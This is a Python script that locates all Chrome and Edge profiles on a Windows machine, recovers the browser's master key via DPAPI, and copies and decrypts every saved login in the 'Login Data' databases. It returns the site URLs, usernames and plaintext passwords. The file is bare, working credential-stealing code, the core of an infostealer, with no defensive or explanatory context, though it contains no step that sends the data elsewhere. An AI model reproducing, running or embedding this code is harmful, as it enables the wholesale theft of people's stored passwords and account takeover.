import os
import shutil
import sqlite3
from Crypto.Cipher import AES 
import json
import base64
import win32crypt

LOCAL = os.getenv("LOCALAPPDATA")
PATHS = {
    'Chrome': os.path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
    'Microsoft Edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
}

def pro():
    profiles = {}
    for browser, base_path in PATHS.items():
        found = []
        if os.path.exists(base_path):
            for entry in os.listdir(base_path):
                profile_path = os.path.join(base_path, entry)
                if os.path.isdir(profile_path) and (
                    entry == "Default" or entry.startswith("Profile")
                ):
                    found.append(profile_path)
        profiles[browser] = found
    return profiles

def decryption(path):
    local_state = os.path.join(path, "Local State")
    if not os.path.exists(local_state):
        return None
    with open(local_state, "r", encoding="utf-8") as f:
        j = json.load(f)
    enc_key_b64 = j["os_crypt"]["encrypted_key"]
    enc_key = base64.b64decode(enc_key_b64)[5:]
    key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
    return key

def decrypt(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        dec = cipher.decrypt(payload)[:-16]
        return dec.decode()
    except:
        try:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
        except:
            return None
        
def extract():
    res = []
    profiles = pro()
    for browser, profile_paths in profiles.items():
        base_path = PATHS.get(browser)
        if not base_path:
            continue

        key_ = decryption(base_path)
        if not key_:
            continue

        for profile_path in profile_paths:
            db_path = os.path.join(profile_path, "Login Data")
            if not os.path.exists(db_path):
                continue

            tmp_db = os.path.join(os.getenv("TEMP"), f"tmp_login_data_{browser}_{os.path.basename(profile_path)}.db")
            try:
                shutil.copy2(db_path, tmp_db)
                conn = sqlite3.connect(tmp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

                for url, user, enc_pass in cursor.fetchall():
                    if user or enc_pass:
                        pwd = decrypt(enc_pass, key_)
                        res.append({
                            "browser": browser,
                            "profile": os.path.basename(profile_path),
                            "url": url,
                            "username": user,
                            "password": pwd,
                        })

                cursor.close()
                conn.close()

            except Exception as e:
                print(f"{e}")

            finally:
                try:
                    os.remove(tmp_db)
                except Exception as e:
                    print(f"{e}")

    return res
